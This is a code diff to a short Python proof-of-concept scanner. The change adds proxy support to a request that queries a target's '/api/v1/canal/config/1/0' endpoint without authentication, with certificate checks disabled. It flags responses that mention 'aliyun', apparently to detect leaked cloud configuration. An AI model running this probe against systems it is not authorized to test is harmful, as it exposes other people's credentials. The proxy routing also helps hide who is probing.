@@ -3,6 +3,8 @@
 
 
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 requests.packages.urllib3.disable_warnings()
@@ -21,7 +23,7 @@ def poc(target):
         "User-Agent":ua
     }
     try:
-        r = requests.get(target+"/api/v1/canal/config/1/0",headers=headers, verify=False)
+        r = requests.get(target+"/api/v1/canal/config/1/0",headers=headers, verify=False,proxies=proxies)
         if r.status_code == 200 and 'aliyun' in r.text:        
             return(r.text)
     except :
